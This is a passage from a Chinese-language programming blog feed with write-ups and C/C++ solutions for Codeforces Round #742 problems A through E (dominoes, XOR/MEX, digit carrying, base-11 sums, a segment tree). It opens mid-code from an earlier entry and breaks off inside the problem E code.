i++)&#123;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;a, &amp;b);</span><br><span class="line">            tree[a].<span class="built_in">push_back</span>(b), tree[b].<span class="built_in">push_back</span>(a);</span><br><span class="line">        &#125;</span><br><span class="line">        ans = <span class="number">1</span>;</span><br><span class="line">        <span class="built_in">dfs</span>(<span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, ans);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><del>后面的先搁着吧, 等星期八再补</del></p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> acm </tag>
            
            <tag> cf </tag>
            
            <tag> 题解 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Codeforces #742 部分题解记录</title>
      <link href="/2021/09/10/Codeforces742/"/>
      <url>/2021/09/10/Codeforces742/</url>
      
        <content type="html"><![CDATA[<h1 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h1><p><del><mark class="hl-label default">语无伦次系列</mark> </del></p><h2 id="A-Domino-Disaster"><a href="#A-Domino-Disaster" class="headerlink" title="A. Domino Disaster"></a>A. Domino Disaster</h2><p><a href="https://codeforces.com/contest/1567/problem/A">原题链接</a></p><blockquote><p>给定一个 $2 \times n$ 的网格, 向其中填入多米诺骨牌, 给出其中一行, 求另一行</p></blockquote><p>直接根据另一行输出即可</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">101</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> T, n, i;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;T);</span><br><span class="line">    <span class="keyword">while</span> (T--)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d %s&quot;</span>, &amp;n, buf);</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">            <span class="built_in"><span class="keyword">switch</span></span>(buf[i])&#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;U&#x27;</span>: <span class="built_in">putchar</span>(<span class="string">&#x27;D&#x27;</span>); <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;D&#x27;</span>: <span class="built_in">putchar</span>(<span class="string">&#x27;U&#x27;</span>); <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;L&#x27;</span>: <span class="built_in">putchar</span>(<span class="string">&#x27;L&#x27;</span>); <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;R&#x27;</span>: <span class="built_in">putchar</span>(<span class="string">&#x27;R&#x27;</span>); <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="B-MEXor-Mixup"><a href="#B-MEXor-Mixup" class="headerlink" title="B. MEXor Mixup"></a>B. MEXor Mixup</h2><p><a href="https://codeforces.com/contest/1567/problem/A">原题链接</a></p><blockquote><p>求一个满足以下条件最短序列的大小:<br>① 不在序列中的最小非负数为 $a$<br>② 序列中所有数异或的结果为 $b$</p></blockquote><div class="note blue flat"><p><strong>众所周知, 异或的两个性质:</strong></p><ul><li><p>$a \oplus b \oplus b = a$</p></li><li><p>若$a \oplus b =  c$, 则 $a = b\oplus c$</p></li></ul></div><p>由①, $0 \sim a-1$ 的数在序列中必须存在, 先把它们与 $b$ 异或, 就可以得到序列中其他元素的异或值$v$</p><p>异或的结果有三种情况:</p><ul><li><p>$v=0$</p><p>不用再加元素了, $0 \sim a-1$ 就可以让它们的异或为$b$.</p></li><li><p>$v=a$</p><p>最坏的情况, 只加一个元素的话只能加$a$, 但是加了$a$就不满足条件①了. 所以尝试加两个元素.</p><p>设$x=\mathrm{0xFFFF0000}$, 可以加上$x$和$v \oplus x$, 这样两个元素均不是$a$而且异或的值等于$a$.</p></li><li><p>其他</p><p>简单加上$v$即可.</p></li></ul><p>可以先将$0 \sim 300000$内异或运算的值缓存到变量<code>tab</code>中.</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">unsigned</span> tab[<span class="number">300001</span>];</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> prev = <span class="number">0</span>, i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt;= <span class="number">300000</span>; i++)&#123;</span><br><span class="line">        prev = tab[i] = prev ^ i;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> T, m, n;</span><br><span class="line">    <span class="built_in">init</span>();</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%u&quot;</span>, &amp;T);</span><br><span class="line">    <span class="keyword">while</span> (T--)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%u %u&quot;</span>, &amp;m, &amp;n);</span><br><span class="line">        <span class="keyword">unsigned</span> v = tab[m - <span class="number">1</span>] ^ n, r;</span><br><span class="line">        <span class="keyword">if</span> (v == <span class="number">0</span>) r = m;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (v == m) r = m + <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">else</span> r = m + <span class="number">1</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%u\n&quot;</span>, r);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="C-Carrying-Conundrum"><a href="#C-Carrying-Conundrum" class="headerlink" title="C. Carrying Conundrum"></a>C. Carrying Conundrum</h2><p><a href="https://codeforces.com/contest/1567/problem/C">原题链接</a></p><blockquote><p>Alice 进行加法计算时, 进位没有算到下一位, 而是下两位, 像这样<br><img src="https://espresso.codeforces.com/6cb0cb293dab7ce533fb10c4da8e27610d5181b9.png" alt="正确的加法"> <img src="https://espresso.codeforces.com/98f8d3960e701645917956668cbe390f5a807d04.png" alt="Alice的加法"><br>现给出$n$, 求有序正整数对的数量, 使得数对中的两个数按照 Alice 的方法可以得出结果$n$.</p></blockquote><div class="tabs" id="方法"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#方法-1">方法 1</button></li><li class="tab"><button type="button" data-href="#方法-2">方法 2</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="方法-1"><p>我的想法是, 枚举能出现的数字, 然后递归枚举所有情况<br>比如已知$n=12345$, 假设$M=\overline{abcde}$, $N=\overline{vwxyz}$.<br>现在知道最后一位数字是5, 那么$(e,z)$可以是$(0,5),(1,4),(2,3),(3,2),(4,1),(5,0),\textcolor{red}{(6,9),(7,8),(8,7),(9,6)}$. <u>标红的是需要进位的情况, 在代码中用<code>adv</code>保存进位</u><br>根据进位与否把这些有序对分为两类, 递归求解在进位与不进位的情况下各有多少种情况(对应代码18~21行), 再把它们相乘相加.<br><u>递归终止条件为数的第一位已算出, 但是还有进位标记</u><br>真正的结果还要减二, 因为0不是正整数, 而我们枚举出的结果是包含$(0,n)$和$(n,0)$的.</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> num[<span class="number">11</span>], adv[<span class="number">12</span>];</span><br><span class="line"><span class="keyword">int</span> N;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">arr</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *p)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    N = <span class="built_in">strlen</span>(p);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; N; i++) num[i] = p[N - i - <span class="number">1</span>] - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">proc</span><span class="params">(<span class="keyword">int</span> d)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i, j; <span class="keyword">unsigned</span> total = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (d &gt;= N) <span class="keyword">return</span> (adv[d] == <span class="number">1</span> || adv[d + <span class="number">1</span>] == <span class="number">1</span>) ? <span class="number">0</span> : <span class="number">1</span>;</span><br><span class="line">    i = num[d] - adv[d];</span><br><span class="line">    adv[d + <span class="number">2</span>] = <span class="number">1</span>;</span><br><span class="line">    total += <span class="built_in">proc</span>(d + <span class="number">1</span>) * (<span class="number">9</span> - i);</span><br><span class="line">    adv[d + <span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">    total += <span class="built_in">proc</span>(d + <span class="number">1</span>) * (i + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> total;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">calc</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(adv, <span class="number">0</span>, <span class="number">12</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">proc</span>(<span class="number">0</span>) - <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> T; <span class="keyword">char</span> p[<span class="number">11</span>];</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%u&quot;</span>, &amp;T);</span><br><span class="line">    <span class="keyword">while</span> (T--)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, p);</span><br><span class="line">        <span class="built_in">arr</span>(p);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%u\n&quot;</span>, <span class="built_in">calc</span>());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="方法-2"><blockquote><p>打cf的时候, 我用的第一种方法, 当时递归出bug了, 调试用了很长时间, 因为递归的bug是真的难找.<br>下面是来自<a href="http://wyh-de-house.top/">@wyh</a>的方法:</p></blockquote><p>因为每次进位都加到下两位, 所以每一位对于相邻的位没有任何影响, 把$n$按奇偶分成两个独立的数, 对于这两个数, 加法时的进位可以看成是正常的, 两数相乘再减二就是结果.<br><img src="/pictures/cf742_d_1.png" alt="过程图解"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> ll;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> t;</span><br><span class="line">    cin &gt;&gt; t;</span><br><span class="line">    <span class="keyword">while</span>(t--)&#123;</span><br><span class="line">        string s;</span><br><span class="line">        cin &gt;&gt; s;</span><br><span class="line">        <span class="keyword">int</span> a = <span class="number">0</span>, b = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; s.<span class="built_in">size</span>(); ++ i)&#123;</span><br><span class="line">            <span class="keyword">if</span>(i&amp;<span class="number">1</span>)&#123;</span><br><span class="line">                a = a*<span class="number">10</span> + s[i]-<span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                b = b*<span class="number">10</span> + s[i]-<span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>, (a+<span class="number">1</span>)*(b+<span class="number">1</span>)<span class="number">-2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后突然感觉我的方法好复杂, 当时时间全花在这个题了. 然后, 就没有然后了<br><del>所以, 人生苦短, 别用递归(误)</del></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="D-Expression-Evaluation-Error"><a href="#D-Expression-Evaluation-Error" class="headerlink" title="D. Expression Evaluation Error"></a>D. Expression Evaluation Error</h2><p><a href="https://codeforces.com/contest/1567/problem/D">原题链接</a></p><blockquote><p>给出整数$s$和$n$, 把$s$拆分成$n$个正整数, 求一种拆分方式, 使这$n$个数被当做11进制相加时, 得到的数最大.</p></blockquote><p>结论: 当有最大为$t$的数可以分配给某个元素时, 分配$10^{[log_{10}{t}]}$是最好的方法之一.<br>11进制下两数和的字面值总是不大于十进制的和, 因为11进制满11才能进位. 所以我们应该尽可能的多保留高位数.<br>然后总是贪心地按这种方法取值就行了.<br>程序流程:<br>假设$s=1000, n=15$.<br>对于第1个元素, 最多有$986$可以分配(因为后面的元素至少需要$1$), 按照前面提到的结论, 分配$100$, 剩下$886$.<br>对于第2个元素, 有$886+1$可以分配, 分配$100$, 剩下$787$.<br>对于第3个元素, 有$787+1$可以分配, 分配$100$, 剩下$688$.<br>…<br>对于第9个元素, 有$193+1$可以分配, 分配$100$, 剩下$94$.<br>对于第10个元素, 有$94+1$可以分配, 分配$10$, 剩下$85$.<br>…<br>对于第15个元素, 有$49+1$可以分配, 这是最后一个元素, 把$50$全部分配给它.<br>至此, 分配方式为$100,100,100,100,100,100,100,100,100,10,10,10,10,10,50$, 程序结束.</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> buf[<span class="number">101</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">min10</span><span class="params">(<span class="keyword">int</span> n)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> t = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (n &gt;= <span class="number">10</span>)&#123;n /= <span class="number">10</span>; t++;&#125;</span><br><span class="line">    <span class="keyword">if</span> (n &gt; <span class="number">1</span>) n = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (t--) n *= <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">calc</span><span class="params">(<span class="keyword">int</span> t, <span class="keyword">int</span> c, <span class="keyword">int</span> o)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (c == <span class="number">0</span>) <span class="keyword">return</span>;</span><br><span class="line">    t++;</span><br><span class="line">    <span class="keyword">int</span> r = <span class="built_in">min10</span>(t);</span><br><span class="line">    buf[o] = c == <span class="number">1</span> ? t : r;</span><br><span class="line">    <span class="built_in">calc</span>(t - r, c - <span class="number">1</span>, o + <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> T;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;T);</span><br><span class="line">    <span class="keyword">while</span> (T--)&#123;</span><br><span class="line">        <span class="keyword">int</span> m, n, i;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;m, &amp;n);</span><br><span class="line">        <span class="built_in">calc</span>(m - n, n, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d%c&quot;</span>, buf[i], (i + <span class="number">1</span> == n) ? <span class="string">&#x27;\n&#x27;</span> : <span class="string">&#x27; &#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="E-Non-Decreasing-Dilemma"><a href="#E-Non-Decreasing-Dilemma" class="headerlink" title="E. Non-Decreasing Dilemma"></a>E. Non-Decreasing Dilemma</h2><p><a href="https://codeforces.com/contest/1567/problem/E">原题链接</a></p><blockquote><p>给出长度为$n$的数组, 进行$q$次操作, 操作有3个数$t,x,y$:</p><ul><li>$t=1$时, 将数组第$x$个元素设置为$y$</li><li>$t=2$时, 输出子数组$[x,y]$中递增子数组的个数</li></ul></blockquote><p>之前尝试了维护递增数组的方法, 最坏复杂度$qn$, 总之就是非常慢, 直接TLE.<br>然后参考了<a href="https://codeforces.com/contest/1567/submission/128027587">maxplus的方法</a>写了个线段树的代码, 复杂度$q \log{n}$.</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Node</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> l, r, lt, rt; <span class="keyword">long</span> <span class="keyword">long</span> sum;</span><br><span class="line">&#125;Node, &amp;NodeRef;</span><br></pre></td></tr></table></figure><p>用<code>Node</code>维护二叉树的每一个结点, 其中<code>l</code>是子数组左边界, <code>r</code>是右边界, <code>lt</code>是在子数组中从左往右看的递增序列的长度, <code>rt</code>是从右往左看单调递减序列的长度, <code>sum</code>是子数组$[l,r]$中递增子数组的个数.</p><p>对于两个非空子树<code>a</code>, <code>b</code>, 合并到父结点的方法:</p><ul><li>左边界为<code>a.l</code>, 右边界为<code>b.r</code></li><li>检查<code>buf[a.r]</code>是否比<code>buf[b.l]</code>大, 即连接两个区间时是否在连接处发生递增的中断(以下简称递增中断)</li><li>如果递增中断或者<code>a.lt</code>本来就小于子数组长度, <code>lt = a.lt</code>, 否则递增在两个区间是连续的, <code>lt = a.lt + b.lt</code>, 对于<code>rt</code>同理.</li><li>合并后区间递增子数组的个数, 除了原先左右子区间各自的个数外, 如果没有递增中断, 应该还包括跨越区间边界的部分, 如下图所示, 最下方的结点递增子数组的个数除包括左右两边子区间各自的个数外, 还有$[A4,A5]$和$[A4,A6]$两个.</li></ul><div class="mermaid">graph TDB1(n&#x3D;1) --&gt; |A1|C1B2(n&#x3D;2) --&gt; |A2|C1B3(n&#x3D;4) --&gt; |A3|C2B4(n&#x3D;3) --&gt; |A4|C2B5(n&#x3D;8) --&gt; |A5|C3B6(n&#x3D;9) --&gt; |A6|C3B7(n&#x3D;5) --&gt; |A7|C4B8(n&#x3D;3) --&gt; |A8|C4C1(s&#x3D;1+1+1*1) --&gt; |B1|D1C2(s&#x3D;1+1) --&gt; |B2|D1C3(s&#x3D;1+1+1*1) --&gt; |B3|D2C4(s&#x3D;1+1) --&gt; |B4|D2D1(s&#x3D;3+2+2*1) --&gt; |C1|ED2(s&#x3D;3+2) --&gt; |C2|EE(s&#x3D;7+5+1*2)</div><p>初始化和<code>t = 1</code>时, 更新叶子结点和对应父节点即可.</p><p><code>t = 2</code>时, 利用线段树中已计算出的结果得到答案:</p><ul><li>对于左边界, 如果是一个右节点, 就先合并结果, 并转到父结点的下一个结点, 左节点则直接转到父结点等待合并.</li><li>对于右边界, 如果是左节点, 合并结果并转到父节点的前一个结点, 右节点转到父节点等待合并.</li><li>一直向树根走直到<code>a &gt; b</code>, 此时<code>l</code>, <code>r</code>已连续, 合并它们并且返回合并结果.</li></ul><p>例如要求$[A2,A8]$递增子数组的个数, 令<code>a = A2</code>, <code>b = A8</code>, <code>l</code>和<code>r</code>为空:</p><ul><li><code>a</code>指向一个右结点(<code>A2</code>), 将它与<code>l</code>合并, 并且让它指向父节点的下一个结点<code>B2</code>.</li><li><code>b</code>指向一个右节点(<code>A8</code>), 让它直接指向父节点<code>B4</code>.</li><li><code>a</code>指向一个右节点(<code>B2</code>), 将它与<code>l</code>合并, 并且让它指向父节点的下一个结点<code>C2</code>.</li><li><code>b</code>指向一个右节点(<code>B4</code>), 让它直接指向父节点<code>C2</code>.</li><li><code>a</code>指向一个右节点(<code>C2</code>), 将它与<code>l</code>合并, 并且让它指向父节点的下一个结点<code>C1</code>(本来是在<code>D1</code>(未标出)的下一个结点, 越界跑到上一层了属于是, 不过问题不大, 因为<code>l</code>已经把$[A5,A8]$合并, 而且后面<code>b</code>在算的时候由于是右结点不合并, 不会导致重复).</li><li><code>b</code>指向一个右结点(<code>C2</code>), 让它直接指向父节点<code>D1</code>.</li><li>此时<code>a &gt; b</code>, 循环结束, 此时<code>l</code>包含了$[A2,A8]$, <code>r</code>为空.</li><li>将<code>l</code>, <code>r</code>合并, 得到在$[A2,A8]$上的结果.</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Referred to the code on https://codeforces.com/contest/1567/submission/128027587</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Node</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> l, r, lt, rt; <span class="keyword">long</span> <span class="keyword">long</span> sum;</span><br><span class="line">&#125;Node, &amp;NodeRef;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> P = <span class="number">1</span> &lt;&lt; <span class="number">18</span>;</span><br><span class="line">Node node[P &lt;&lt; <span class="number">1</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> buf[<span class="number">200000</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">combine</span><span class="params">(NodeRef a, NodeRef b, NodeRef p)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!a.sum || !b.sum)&#123;p = a.sum ? a : b; <span class="keyword">return</span>;&#125;</span><br><span class="line">    p.l = a.l, p.r = b.r;</span><br><span class="line">    <span class="keyword">int</span> cont = buf[a.r] &lt;= buf[b.l];</span><br><span class="line">    p.lt = (cont &amp;&amp; a.lt + a.l == a.r + <span class="number">1</span>) ? a.lt + b.lt : a.lt;</span><br><span class="line">    p.rt = (cont &amp;&amp; b.rt + b.l == b.r + <span class="number">1</span>) ? a.rt + b.rt : b.rt;</span><br><span class="line">    p.sum = a.sum + b.sum + (cont ? ((<span class="keyword">long</span> <span class="keyword">long</span>)a.rt) * b.lt : <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="keyword">long</span> <span class="title">calc</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span>&#123;</span><br><span class="line">    Node l = &#123;<span class="number">0</span>&#125;, r = &#123;<span class="number">0</span>&#125;, t;</span><br><span 